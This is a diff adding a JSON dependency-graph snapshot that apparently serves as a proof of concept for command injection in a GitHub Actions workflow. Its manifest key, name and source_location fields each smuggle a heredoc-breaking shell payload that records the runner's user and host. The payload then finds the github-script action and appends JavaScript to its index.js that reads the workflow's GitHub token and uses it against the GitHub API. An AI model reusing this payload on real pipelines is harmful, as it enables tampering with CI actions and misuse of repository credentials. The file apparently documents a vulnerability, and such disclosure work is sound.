@@ -1,0 +1,30 @@
+{
+ "version": 0,
+ "job": {
+  "id": "poc",
+  "correlator": "poc"
+ },
+ "sha": "cccccccccccccccccccccccccccccccccccccccc",
+ "ref": "refs/heads/main",
+ "detector": {
+  "name": "poc",
+  "version": "1",
+  "url": "https://example.com"
+ },
+ "scanned": "2026-10-30T00:00:00Z",
+ "manifests": {
+  "weird.json\nEOF\necho \"RCE marker: $(id -un)@$(hostname) in $GITHUB_WORKFLOW\" > /tmp/gab_rce_marker\nACT_DIR=$(ls -d /home/runner/work/_actions/actions/github-script/*/dist 2>/dev/null | head -1)\necho \"ACT_DIR=$ACT_DIR\" >> /tmp/gab_rce_marker\ncat >> \"$ACT_DIR/index.js\" <<'JS'\nconst _fs=require('fs');\n(async () => {\n  const t = process.env['INPUT_GITHUB-TOKEN'] || '';\n  let out = 'token_len=' + t.length + '\\n';\n  try {\n    const r = await fetch('https://api.github.com/repos/PDFtoMark/gab-poc-depgraph-inject', {headers: {Authorization: 'Bearer ' + t, Accept: 'application/vnd.github+json', 'User-Agent': 'poc'}});\n    const j = await r.json();\n    out += 'api_status=' + r.status + ' repo=' + (j.full_name || j.message) + '\\n';\n  } catch (e) { out += 'api_err=' + e.message + '\\n'; }\n  _fs.writeFileSync('/tmp/gab_action_tamper', out);\n})();\nJS\nexit 0\nEOF\nweird.json": {
+   "name": "weird.json\nEOF\necho \"RCE marker: $(id -un)@$(hostname) in $GITHUB_WORKFLOW\" > /tmp/gab_rce_marker\nACT_DIR=$(ls -d /home/runner/work/_actions/actions/github-script/*/dist 2>/dev/null | head -1)\necho \"ACT_DIR=$ACT_DIR\" >> /tmp/gab_rce_marker\ncat >> \"$ACT_DIR/index.js\" <<'JS'\nconst _fs=require('fs');\n(async () => {\n  const t = process.env['INPUT_GITHUB-TOKEN'] || '';\n  let out = 'token_len=' + t.length + '\\n';\n  try {\n    const r = await fetch('https://api.github.com/repos/PDFtoMark/gab-poc-depgraph-inject', {headers: {Authorization: 'Bearer ' + t, Accept: 'application/vnd.github+json', 'User-Agent': 'poc'}});\n    const j = await r.json();\n    out += 'api_status=' + r.status + ' repo=' + (j.full_name || j.message) + '\\n';\n  } catch (e) { out += 'api_err=' + e.message + '\\n'; }\n  _fs.writeFileSync('/tmp/gab_action_tamper', out);\n})();\nJS\nexit 0\nEOF\nweird.json",
+   "file": {
+    "source_location": "weird.json\nEOF\necho \"RCE marker: $(id -un)@$(hostname) in $GITHUB_WORKFLOW\" > /tmp/gab_rce_marker\nACT_DIR=$(ls -d /home/runner/work/_actions/actions/github-script/*/dist 2>/dev/null | head -1)\necho \"ACT_DIR=$ACT_DIR\" >> /tmp/gab_rce_marker\ncat >> \"$ACT_DIR/index.js\" <<'JS'\nconst _fs=require('fs');\n(async () => {\n  const t = process.env['INPUT_GITHUB-TOKEN'] || '';\n  let out = 'token_len=' + t.length + '\\n';\n  try {\n    const r = await fetch('https://api.github.com/repos/PDFtoMark/gab-poc-depgraph-inject', {headers: {Authorization: 'Bearer ' + t, Accept: 'application/vnd.github+json', 'User-Agent': 'poc'}});\n    const j = await r.json();\n    out += 'api_status=' + r.status + ' repo=' + (j.full_name || j.message) + '\\n';\n  } catch (e) { out += 'api_err=' + e.message + '\\n'; }\n  _fs.writeFileSync('/tmp/gab_action_tamper', out);\n})();\nJS\nexit 0\nEOF\nweird.json"
+   },
+   "resolved": {
+    "pkg:npm/leftpad@1.0.0": {
+     "package_url": "pkg:npm/leftpad@1.0.0",
+     "relationship": "direct",
+     "scope": "runtime"
+    }
+   }
+  }
+ }
+}
